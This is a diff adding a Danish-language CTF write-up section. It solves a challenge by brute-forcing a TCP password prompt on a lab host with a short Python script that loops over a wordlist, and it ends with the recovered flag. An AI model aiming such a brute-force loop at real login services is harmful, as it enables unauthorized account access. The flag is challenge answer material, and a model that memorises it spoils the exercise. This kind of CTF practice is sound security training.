@@ -428,7 +428,6 @@ I zip-filen er der to filer:
 chall.java
 wordlist.txt
 
-
 chall.java indeholder koden: 
 ```java 
 import java.io.*;
@@ -499,7 +498,53 @@ public class chall {
     }
 }
 ```
+Koden hasher det kendte kodeord, og checker hvorvidt det givne hash der bliver givet passer med det gemte. 
+Det ville sandsynligvis være muligt at reverse hashing algoritmen og dermed blot få passwordet derfra. 
+Dog bliver der givet en wordlist, og derfor insinueres der skal bruteforces. Ud af det kom dette script: 
+```python 
+import socket
+import time
 
+host = "wizard-trial.hkn"
+port = 1337
+def bruteforce(password):
+	with socket.create_connection((host, port)) as s:
+			data = s.recv(1024).decode()
+			if "ENTER PASSWORD" not in data:
+				data += s.recv(1024).decode()
+			s.sendall(password.encode())
+			time.sleep(0.5)
+			response = s.recv(1024).decode()
+			time.sleep(0.5)
+			if "***CRACKED:" in response:
+				print(f"Success! Password: {password}")
+				print(response)
+				return True
+			else:
+				print(f"Tried: {password.strip()}")
+				return False
+
+
+
+f = open("wordlist.txt", "r")
+for x in f:
+  if bruteforce(x) == True: 
+  	break
+```
+Funktionen bruteforce(password) gør følgende: 
+-Tager en string
+-Forbinder til TCP-serveren
+-Læser alle linjer indtil "***ENTER PASSWORD:"
+-Dernæst sender den string'en der er givet
+-Den tjekker dernæst for om passwordet er korrekt
+-Er den korrekt returnerer den sand og printer resten, ellers falsk
+
+Dernæst satte jeg blot et for loop op til at iterere igennem alle linjer i tekstfilen indtil funktionen returnerer True. 
+Dette endte med at give resultatet: 
+```bash
+***CRACKED: DDC{w1zardM4st3r_brut3_f0rc3_ch4rm}
+```
+Jeg fik dermed flaget: DDC{w1zardM4st3r_brut3_f0rc3_ch4rm}
 ### sledgehammer 
 
 Challenge beskrivelse: 
